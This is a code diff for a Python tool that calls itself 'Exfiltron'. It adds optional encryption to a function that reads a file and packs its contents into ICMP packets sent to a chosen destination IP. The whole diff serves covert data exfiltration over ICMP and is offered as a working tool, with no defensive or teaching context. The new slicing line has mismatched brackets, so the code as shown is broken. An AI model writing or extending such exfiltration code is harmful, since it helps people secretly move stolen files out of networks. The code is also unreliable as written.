@@ -11,9 +11,9 @@ import os
 import sys
 from math import ceil
 
-def icmp(destIP, filename, BytesPP):
+def icmp(destIP, filename, BytesPP, encrypt):
     """
-    args: destinationIP(str), filename(str), BytesPerPacket(int)
+    args: destinationIP(str), filename(str), BytesPerPacket(int), encrypt (bool)
     return: list of packets
     """
     READ_ONLY = 'r'
@@ -35,12 +35,26 @@ def icmp(destIP, filename, BytesPP):
     
     # opening the specified file **needs error handling**
     OFile = open(filename, READ_ONLY)  
+
+    # Encrypt the file
+    if(encrypt):
+        # Check to make sure Exfiltron's encryption module is available
+        try:
+            import encryption
+        except ImportError:
+            print("Could not import Exfiltron's encryption module")
+            print("Exiting...")
+            sys.exit()
+        cipherText = encryption.encrypt(OFile.read())
  
     # Read the specified amount of data from the file, append it to the packet
     # and add the packet to the list of packets to send
     for i in range(numPackets):
-        OFile.seek(i*BytesPP)
-        listOfPackets.append(IP(dst=destIP)/ICMP()/OFile.read(BytesPP))
+        if(encrypt):
+            listOfPackets.append(IP(dst=destIP)/ICMP()/cipherText[(i*BytesPP):((i+1)*BytesPP])
+        else:
+            OFile.seek(i*BytesPP)
+            listOfPackets.append(IP(dst=destIP)/ICMP()/OFile.read(BytesPP))
 
     OFile.close()
 
